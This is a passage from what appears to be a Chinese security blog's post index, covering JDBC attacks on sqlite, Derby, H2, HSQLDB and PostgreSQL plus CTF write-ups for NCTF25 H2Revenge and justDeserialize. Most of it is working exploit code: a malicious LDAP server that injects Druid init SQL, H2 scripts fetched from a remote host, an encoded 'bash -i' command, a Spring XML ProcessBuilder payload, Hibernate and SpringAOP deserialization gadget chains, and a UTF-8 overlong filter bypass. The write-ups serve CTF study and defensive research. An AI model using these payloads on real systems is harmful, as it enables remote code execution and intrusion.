绕过合集\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"sqlite攻击","url":"/2025/05/05/sqlite%E6%94%BB%E5%87%BB/","content":"前言适用于load_extension打开的情况，比如：\n虽然这种情况现实中比较少。\n第一次遇到是在ciscn24_ezjava上\n分析首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE\n漏洞利用流程：\n（前提：靶机能够执行select * from xxx，xxx可控）\n1、在vps上创建rce.c，编译成rce.so。通过JDBC连接(jdbc:sqlite::resource:http://10.195.247.79:7776/rce.so)，可以获取vps上的rce.so，并保存到/tmp/sqlite-jdbc-tmp-xxxx.db。其中xxxx的计算方式可知。\n2、新建exp.db，用navicat创建一个sqlite连接。新建一个查询，执行CREATE VIEW security as SELECT (SELECT load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–xxxx.db’)); 这样会新建一个视图\n3、通过JDBC连接，可以获取vps上的exp.db，执行load_extension，加载之前的so文件，实现rce。即靶机最后执行select * from security\n如果能写文件的话，那就直接写so文件，然后加载就行了。最终的目的反正都是加载so文件。\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Derby","url":"/2025/05/05/Derby/","content":"也是想办法执行初始化sql语句。不过这个不像h2一样，可以在URL里直接用INIT参数。这个需要配合JNDI+Druid。DruidDataSourceFactory里面有initConnectionSqls字段，并且可以在JNDI时设置，从而实现初始化sql。\n先写恶意jar包：\npackage com.example;import java.io.IOException;public class Runtime &#123;    public static void exec(String cmd) &#123;        try &#123;            java.lang.Runtime.getRuntime().exec(cmd);            System.out.println(&quot;cmd executed successfully&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\njavac .\\src\\main\\java\\com\\example\\Runtime.java\njar -cvf Runtime.jar .src\\ .\npython -m http.server 8088\n然后写恶意ldap服务器：\npackage com.example.server;import com.example.solution.Tools17;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.naming.Reference;import javax.naming.StringRefAddr;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.util.ArrayList;import java.util.List;// jndi 绕过 jdk8u191 之前的攻击public class JNDILdapServer &#123;    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;    public static void main (String[] args) &#123;        String url = &quot;http://127.0.0.1:8088/poc.sql&quot;;        int port = 1388;        try &#123;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;,                    InetAddress.getByName(&quot;0.0.0.0&quot;),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor());            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        /**         *         */        public OperationInterceptor ( ) &#123;//            this.codebase = cb;        &#125;        /**         * &#123;@inheritDoc&#125;         *         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */        @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);            try &#123;                List&lt;String&gt; list = new ArrayList&lt;&gt;();                list.add(&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://127.0.0.1:8088/Runtime.jar&#x27;, &#x27;APP.Runtime&#x27;, 0)&quot;);                list.add(&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Runtime&#x27;)&quot;);                //  list.add(&quot;CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;com.example.Runtime.exec&#x27;&quot;);//                list.add(&quot;CALL SALES.TOTAL_REVENUES()&quot;);                list.add(&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;com.example.Runtime.exec&#x27;&quot;);                list.add(&quot;CALL cmd(&#x27;calc&#x27;)&quot;);                Reference ref = new Reference(&quot;javax.sql.DataSource&quot;, &quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;, null);                ref.add(new StringRefAddr(&quot;url&quot;, &quot;jdbc:derby:mydb;create=true&quot;));                ref.add(new StringRefAddr(&quot;init&quot;, &quot;true&quot;));                ref.add(new StringRefAddr(&quot;initialSize&quot;, &quot;1&quot;));                ref.add(new StringRefAddr(&quot;initConnectionSqls&quot;, String.join(&quot;;&quot;, list)));                e.addAttribute(&quot;javaSerializedData&quot;, Tools17.ser(ref));                result.sendSearchEntry(e);                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));            &#125; catch (Exception exception) &#123;                exception.printStackTrace();            &#125;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);            String cbstring = this.codebase.toString();            int refPos = cbstring.indexOf(&#x27;#&#x27;);            if ( refPos &gt; 0 ) &#123;                cbstring = cbstring.substring(0, refPos);            &#125;            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;\n\n最后写poc：\npackage com.example.solution;import com.alibaba.druid.pool.DruidDataSource;import javax.naming.InitialContext;import javax.naming.NamingException;public class Poc &#123;    public static void main(String[] args) throws NamingException &#123;        InitialContext initialContext = new InitialContext();        String url = &quot;ldap://localhost:1388/anything&quot;;        Object lookup = initialContext.lookup(url);    &#125;&#125;","categories":["Java安全"],"tags":["Java安全"]},{"title":"h2sql","url":"/2025/05/05/h2sql/","content":"第一次用到是在ez_solon里面\n先简单给个EXP吧，之后再碰到再详细写\n找有getConnect的类，然后url这样写\nUnpooledDataSource dataSource = new UnpooledDataSource(&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/h2.sql&#x27;&quot;, &quot;1diOt9&quot;, &quot;123456&quot;, &quot;org.database.Driver&quot;);\n\n.sql文件有多种写法\nScript引擎加载（jdk17失效）一是直接用JavaScript引擎加载执行：\nCREATE TABLE test (     id INT NOT NULL );CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS &#x27;//javascriptJava.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;;\n\n值得注意的是，这个方法在jdk17里会失效，因为Java17版本中JavaScript引擎(Nashorn)已经被删除。NCTF25的H2 Revenge就考了这个。\n定义函数执行二是定义一个函数执行：\nCREATE ALIAS SHELL AS $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;CALL SHELL(&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;);\n\n值得注意的是如果只有jre而没有jdk，那么这个也会失效。因为这个方法需要jdk将函数编译后使用，如果只有jre就没办法编译了。\n调用public static 函数MyDataSource myDataSource = new MyDataSource(&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;&quot;, &quot;1diOt9&quot;, &quot;123456&quot;);CREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;;CREATE ALIAS NEW_INSTANCE FOR &#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;;CREATE ALIAS UNESCAPE_VALUE FOR &#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;;SET @url_str=&#x27;http://vps:port/h2_revenge_evil.xml&#x27;;SET @url_obj=UNESCAPE_VALUE(@url_str);SET @context_clazz=CLASS_FOR_NAME(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;);SET @string_clazz=CLASS_FOR_NAME(&#x27;java.lang.String&#x27;);CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);\n\n\n\n写文件NCTF2024 Web方向题解-CSDN博客\nCALL FILE_WRITE(X’自己的so的十六进制编码’, ‘&#x2F;tmp&#x2F;exp.so’);\nCREATE ALIAS IF NOT EXISTS System_load FOR “java.lang.System.load(java.lang.String)”;\nCALL System_load(‘&#x2F;tmp&#x2F;exp.so’);\n参考H2 database漏洞复现 - Running_J - 博客园\n[JavaSec&#x2F;9.JDBC Attack&#x2F;h2&#x2F;index.md at main · Y4tacker&#x2F;JavaSec](https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC Attack&#x2F;h2&#x2F;index.md)\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"hsql","url":"/2025/05/05/hsql/","content":"直接看例子吧：\npublic class Test01 &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;        Class&lt;?&gt; aClass = Class.forName(&quot;org.hsqldb.jdbc.JDBCDriver&quot;);        String dburl = &quot;jdbc:hsqldb:mem&quot;;        Connection connection = DriverManager.getConnection(dburl, &quot;sa&quot;, &quot;&quot;);        connection.prepareStatement(&quot;CALL \\&quot;javax.naming.InitialContext.doLookup\\&quot;(&#x27;ldap://192.168.126.1:1389/0r1wr1&#x27;)&quot;).executeQuery();    &#125;&#125;\n\n漏洞原因是，hsql查询时可以调用任意public static 方法。上面的就是调用doLookup，实现JNDI注入。\n在高版本下，JNDI可能被禁用，这时候也可以通过重新覆盖字段来绕过：\nCALL java.lang.System.setProperty&quot;(&#x27;com.sun.jndi.ldap.object.trustURLCodebase&#x27;,&#x27;true&#x27;) + &quot;javax.naming.InitialContext.doLookup&quot;(&#x27;ldap://127.0.0.1:4444/pgesux&#x27;)\n\n当然，如果找到了类似deserialize等二次反序列化的函数，也可以直接用，payload类似：\nCALL &quot;java.lang.System.setProperty&quot;(&#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27;,&#x27;true&#x27;) + &quot;org.apache.commons.lang.SerializationUtils.deserialize&quot;(&quot;org.apache.logging.log4j.core.config.plugins.convert.Base64Converter.parseBase64Binary&quot;(&#x27;rO0A....&#x27;))\n\n下面记录一下可以用的二次反序列化函数。\nspring-core:org.springframework.util.ReflectUtils#defineClass\t字节码加载\norg.springframework.util.SerializationUtils.deserialize\t二次反序列化\n下面两个在5版本的hsql中测试失败，3、4版本的没测试：\nCALL org.hsqldb.util.ScriptTool.main\norg.hsqldb.lib.InOutUtil.deserialize\n另外，hsql还可以结合druid来扩大攻击面，实现jndi到jdbc攻击。这里面利用的是druid里的一个工厂类。利用这个工程类，能够实现高版本jndi+jdbc攻击。\n参考HSQLDB 安全测试指南 - 浅蓝 ‘s blog\nCVE-2022-41853 分析：通过 Java 反序列化和远程代码库攻击使用静态函数获取 RCE | CN-SEC 中文网\n关于hsqldb反序列化漏洞的一些思考-先知社区\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"postgreSQL","url":"/2025/05/05/postgreSQL/","content":"构造方法调用DriverManager.getConnection(“jdbc:postgresql:&#x2F;&#x2F;node1&#x2F;test?socketFactory&#x3D;org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg&#x3D;http://target/exp.xml“);\n写文件public class cve202221724 &#123;    public static void main(String[] args) throws SQLException &#123;        String loggerLevel = &quot;debug&quot;;        String loggerFile = &quot;test.txt&quot;;        String shellContent=&quot;test&quot;;        String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;+loggerLevel+&quot;&amp;loggerFile=&quot;+loggerFile+ &quot;&amp;&quot;+shellContent;        Connection connection = DriverManager.getConnection(jdbcUrl);    &#125;&#125;\n\n不过这样写保存的文件前后会有脏字符。\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"NCTF25--H2Revenge","url":"/2025/05/06/NCTF25-H2Revenge/","content":"思路确定题目是jdk17环境，先看依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;3.4.3&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.h2database&lt;/groupId&gt;    &lt;artifactId&gt;h2&lt;/artifactId&gt;    &lt;version&gt;2.3.232&lt;/version&gt;&lt;/dependency&gt;\n\n分析一下可用资源：\n1、springboot自带的jackson链\n2、h2可以打JDBC，能够自定义函数执行，或者直接用JavaScript引擎加载(这个方法在jdk17失效)\n3、有tomcat，但是版本比较高，10.1.36，在jndi时也许能用\n再看一下题目：\n1、从Dockerfile里可以看到，是jre17，而不是jdk17。这意味着我们无法编译代码\n2、反序列化入口明显，且没有任何过滤\n3、MyDataSource存在getConnection方法，且连接的url可控\n综上，能够大概确定思路：\n1、jackson触发MyDataSource的getConnection，然后打h2数据库\nh2 新打法一般来说，h2数据库要么用自定义函数执行，或者直接用JavaScript引擎加载。不过这两种这里都不能用。前者因为自定义的函数在jre环境下无法编译，后者是因为jdk17里JavaScript引擎被废除。因此我们需要找新的方法。\n如果做过其他jdk17打JDBC的题，就会发现：许多数据库都是可以直接调用Java的public static方法的。h2也不例外，这点可以去翻看官方文档https://h2database.com/html/features.html![img](image-1746531786413.png)\n或者去问AI验证一下：\n那么，我们现在就可以确定怎么打h2 JDBC了。不过我们还需要确定通过什么public static方法去打。\n看了wp，发现里面用的是org.springframework.cglib.core.ReflectUtils#newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])\nReflectUtils是Springboot自带的一个很好用的类，里面还有defineClass。\n另外，值得一提的还有org.springframework.util.SerializationUtils#deserialize，这个可以用来二次反序列化。\n后面新学了一个rce的方法，就是加载xml。就是通过org.springframework.context.support.ClassPathXmlApplicationContext的构造方法加载恶意xml文件\npackage solution;import org.springframework.context.support.ClassPathXmlApplicationContext;import java.lang.reflect.Constructor;public class ClassPathXml &#123;    public static void main(String[] args) throws Exception &#123;        Tools17.bypassModule(ClassPathXml.class);        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext();        Class&lt;?&gt; aClass = Class.forName(context.getClass().getName(), false, context.getClassLoader());        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(String.class);        declaredConstructor.setAccessible(true);        declaredConstructor.newInstance(&quot;http://127.0.0.1:9990/1.xml&quot;);    &#125;&#125;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc&lt;/value&gt;            &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n直接在xml目录下起一个http服务就行。\n最后还需要编写一下poc.sql文件。这里也有一个注意点，先展示：\nCREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;;CREATE ALIAS NEW_INSTANCE FOR &#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;;CREATE ALIAS UNESCAPE_VALUE FOR &#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;;SET @url_str=&#x27;http://vps:port/h2_revenge_evil.xml&#x27;;SET @url_obj=UNESCAPE_VALUE(@url_str);SET @context_clazz=CLASS_FOR_NAME(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;);SET @string_clazz=CLASS_FOR_NAME(&#x27;java.lang.String&#x27;);CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);\n\n要注意的地方就是@url_str算varchar类型，而我们的newInstance里需要Object[]，所以需要找一个public static类，能够把String转为Object。（这里勘误一下，应该是Object转为String。因为最终需要的Object[]里面的内容是String，而现在需要将VERCHAR转为String。并且ARRAY[]只支持String。但是这样下面的查询语句就不对了，也就找不到wp里的那个类了，不知道有没有师傅知道应该怎么解释）用tabby找一下：\n搜出来的方法不是很多，排除掉没有exports的模块其实剩的就很少了。我们需要的javax.naming.ldap.Rdn.unescapeValue也在里面。\ntabby找新类（失败）这里我发现org.springframework.scripting.bsh.BshScriptUtils#createBshObject应该也行，给的输入是”new java.lang.Object[]{&quot;http://127.0.0.1/1.xml\\&quot;}&quot;就行。然而这个类本身有报错，说是包没导入：![img](image-1746531786459.png)\n我想既然spring里有这个类，那不应该自动下所需的包吗，不知道这里为什么。\n后面又去试了一下createBshObject，发现可能不行。虽然能返回Object[]，但是h2sql转化不了，会报类型转化错误，不知道有没有师傅可以解决。\n最后觉得应该是必须用 sql 语句自带的 ARRAY 转成 Object 数组，而不能直接传一个 Object[]。然后上面那个缺失包的情况，其实还挺常见的，就是在需要用时，自己把包导入。所以这题就没法用这个新找的链子了。自己找链子又失败了，悲。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"软件安全赛半决赛--justDeserialize","url":"/2025/05/08/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B-justDeserialize/","content":"依赖：springboot是2.7.0\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.hsqldb&lt;/groupId&gt;    &lt;artifactId&gt;hsqldb&lt;/artifactId&gt;    &lt;version&gt;2.4.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.8&lt;/version&gt;&lt;/dependency&gt;\n\n\n\n题目是jdk11，我这里用jdk11.0.26\n先分析可用资源：\n\nhsqldb是内存型数据库，很可能可以通过call的方式实现方法调用\ndruid是个数据库连接池，它可以在jndi中，通过本地工厂类的方式，将jndi转化成jdbc，即能够控制数据库连接时的参数，并在连接前执行任意查询语句\nspringboot-jpa里带hibernate，aspectjweaver，springaop依赖\njdk11里，模块化特性还没强制生效。虽然没有exports的包还是没法直接用，但是可以在jdk8下编译，得到的payload直接去打jdk11的服务也行\n\n再看题目：\n\n反序列化点很直接，不过有两次过滤\n第一次过滤基于字符串匹配，能够直接通过UTF8 Overlong绕过\n第二次是resolveClass，只能想办法绕过黑名单，这个黑名单主要禁的是readObject—&gt;toString\n\nhiberate链这里通过触发org.hibernate.engine.spi.TypedValue#hashCode，最终实现任意getter方法调用，即hibernate链\n可以触发com.sun.rowset.JdbcRowSetImpl#getParameterMetaData，然后jndi\n也可以触发com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition，然后jndi\n不过这里HashMap被ban，所以需要使用HashTable来触发hashCode\n我这里jdk11.0.26，trustcodebase和trustserialdata都默认为false，所以不能通过传统的方式打jndi。这里直接使用java-chain工具生成ldap服务器：\n之后就是DruidDataSourceFactory到hsql的jdbc attack了\nhsql是能够调用任意public static方法的，所以这里选org.springframework.util.ReflectionUtils.defineClass来加载字节码。\nPoc：要在jdk8下生成，jdk11里JdbcRowSetImpl没有exports\npackage com.example.ezjav.solution;import com.example.ezjav.utils.MyObjectInputStream;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.Hashtable;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/77e2e4&quot;);        GetterMethodImpl getterMethod = new GetterMethodImpl(JdbcRowSetImpl.class, &quot;databaseMetaData&quot;, jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;));        PojoComponentTuplizer o = (PojoComponentTuplizer) Tools.getObjectByUnsafe(PojoComponentTuplizer.class);        Tools.setFieldValue(o, &quot;getters&quot;, new Getter[]&#123;getterMethod&#125;);        ComponentType o1 = (ComponentType) Tools.getObjectByUnsafe(ComponentType.class);        Tools.setFieldValue(o1, &quot;componentTuplizer&quot;, o);        Tools.setFieldValue(o1, &quot;propertySpan&quot;, 1);        TypedValue typedValue = new TypedValue(o1, jdbcRowSet);//        typedValue.hashCode();        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();        hashtable.put(&quot;1&quot;, &quot;2&quot;);        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashtable);        for (Object entry: table)&#123;//            System.out.println(entry);            if (entry != null)&#123;                Tools.setFieldValue(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        CustomObjectOutputStream oos = new CustomObjectOutputStream(baos);        oos.writeObject(hashtable);        oos.close();        String s = Base64.getEncoder().encodeToString(baos.toByteArray());        Base64.getDecoder().decode(s);        new FileOutputStream(&quot;D://1tmp//payload.txt&quot;).write(s.getBytes());        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        new MyObjectInputStream(bais).readObject();    &#125;&#125;\n\n\n\nLdapAttribute链触发getter的方式跟上面一样，都用hibernate链\npublic static BasicAttribute getGadgetObj()&#123;    try&#123;        Class clazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);        Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]&#123;String.class&#125;);        clazz_cons.setAccessible(true);        BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]&#123;&quot;exp&quot;&#125;);        Field bcu_fi = clazz.getDeclaredField(&quot;baseCtxURL&quot;);        bcu_fi.setAccessible(true);        bcu_fi.set(la, &quot;ldap://127.0.0.1:1389/&quot;);        CompositeName cn = new CompositeName();        cn.add(&quot;a&quot;);        cn.add(&quot;b&quot;);        Field rdn_fi = clazz.getDeclaredField(&quot;rdn&quot;);        rdn_fi.setAccessible(true);        rdn_fi.set(la, cn);        return la;    &#125;catch (Exception e)&#123;        e.printStackTrace();    &#125;    return null;&#125;\n\n\n\nSpringAOP新链能触发任意方法。根据接口类型，所需要的启动方式也不一样，比如这里用toString启动。如果再套一层Comparator接口，那就可以用Compare启动。\npackage com.example.ezjav.solution;import com.sun.rowset.JdbcRowSetImpl;import org.aopalliance.aop.Advice;import org.springframework.aop.aspectj.AspectJAroundAdvice;import org.springframework.aop.aspectj.AspectJExpressionPointcut;import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;import org.springframework.aop.framework.ProxyFactory;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.Comparator;public class Poc02 &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:50389/99b8ce&quot;);        Method declaredMethod = jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;);//        Person person = new Person();//        Method declaredMethod = Person.class.getDeclaredMethod(&quot;getName&quot;);        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();        SingletonAspectInstanceFactory instanceFactory = new SingletonAspectInstanceFactory(jdbcRowSet);        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(declaredMethod, pointcut, instanceFactory);        ProxyFactory proxyFactory = new ProxyFactory(jdbcRowSet);        proxyFactory.addAdvice(aspectJAroundAdvice);        Object proxy = proxyFactory.getProxy();        proxy.toString();        //        Object o = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Comparator.class&#125;,(InvocationHandler) proxy);//        o.compare(&quot;aaa&quot;, &quot;bbb&quot;);            &#125;&#125;\n\n\n\n参考软件攻防赛现场赛上对justDeserialize攻击的几次尝试 | GSBP’s Blog\n软件系统安全赛2025华东赛区半决赛wp-web - Potat0w0\nhttps://github.com/vulhub/java-chains/\n微信公众平台 Springaop新链\n分析尝试利用tabby挖掘-SpringAOP链 - Potat0w0 SpringAOP新链简化版\nJava反序列化之Hibernate - Potat0w0 hibernate链\t\t注意大于5版本和小于5版本的利用方式不同\nhibernate1利用链分析 | 藏青’s BLOG\nUTF 8 Overlong 工具类package com.example.ezjav.solution;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;public class CustomObjectOutputStream extends ObjectOutputStream &#123;    private static HashMap&lt;Character, int[]&gt; map;    static &#123;        map = new HashMap&lt;&gt;();        map.put(&#x27;.&#x27;, new int[]&#123;0xc0, 0xae&#125;);        map.put(&#x27;;&#x27;, new int[]&#123;0xc0, 0xbb&#125;);        map.put(&#x27;$&#x27;, new int[]&#123;0xc0, 0xa4&#125;);        map.put(&#x27;[&#x27;, new int[]&#123;0xc1, 0x9b&#125;);        map.put(&#x27;]&#x27;, new int[]&#123;0xc1, 0x9d&#125;);        map.put(&#x27;a&#x27;, new int[]&#123;0xc1, 0xa1&#125;);        map.put(&#x27;b&#x27;, new int[]&#123;0xc1, 0xa2&#125;);        map.put(&#x27;c&#x27;, new int[]&#123;0xc1, 0xa3&#125;);        map.put(&#x27;d&#x27;, new int[]&#123;0xc1, 0xa4&#125;);        map.put(&#x27;e&#x27;, new int[]&#123;0xc1, 0xa5&#125;);        map.put(&#x27;f&#x27;, new int[]&#123;0xc1, 0xa6&#125;);        map.put(&#x27;g&#x27;, new int[]&#123;0xc1, 0xa7&#125;);        map.put(&#x27;h&#x27;, new int[]&#123;0xc1, 0xa8&#125;);        map.put(&#x27;i&#x27;, new int[]&#123;0xc1, 0xa9&#125;);        map.put(&#x27;j&#x27;, new int[]&#123;0xc1, 0xaa&#125;);        map.put(&#x27;k&#x27;, new int[]&#123;0xc1, 0xab&#125;);        map.put(&#x27;l&#x27;, new int[]&#123;0xc1, 0xac&#125;);        map.put(&#x27;m&#x27;, new int[]&#123;0xc1, 0xad&#125;);        map.put(&#x27;n&#x27;, new int[]&#123;0xc1, 0xae&#125;);        map.put(&#x27;o&#x27;, new int[]&#123;0xc1, 0xaf&#125;); // 0x6f        map.put(&#x27;p&#x27;, new int[]&#123;0xc1, 0xb0&#125;);        map.put(&#x27;q&#x27;, new int[]&#123;0xc1, 0xb1&#125;);        map.put(&#x27;r&#x27;, new int[]&#123;0xc1, 0xb2&#125;);        map.put(&#x27;s&#x27;, new int[]&#123;0xc1, 0xb3&#125;);        map.put(&#x27;t&#x27;, new int[]&#123;0xc1, 0xb4&#125;);        map.put(&#x27;u&#x27;, new int[]&#123;0xc1, 0xb5&#125;);        map.put(&#x27;v&#x27;, new int[]&#123;0xc1, 0xb6&#125;);        map.put(&#x27;w&#x27;, new int[]&#123;0xc1, 0xb7&#125;);        map.put(&#x27;x&#x27;, new int[]&#123;0xc1, 0xb8&#125;);        map.put(&#x27;y&#x27;, new int[]&#123;0xc1, 0xb9&#125;);        map.put(&#x27;z&#x27;, new int[]&#123;0xc1, 0xba&#125;);        map.put(&#x27;A&#x27;, new int[]&#123;0xc1, 0x81&#125;);  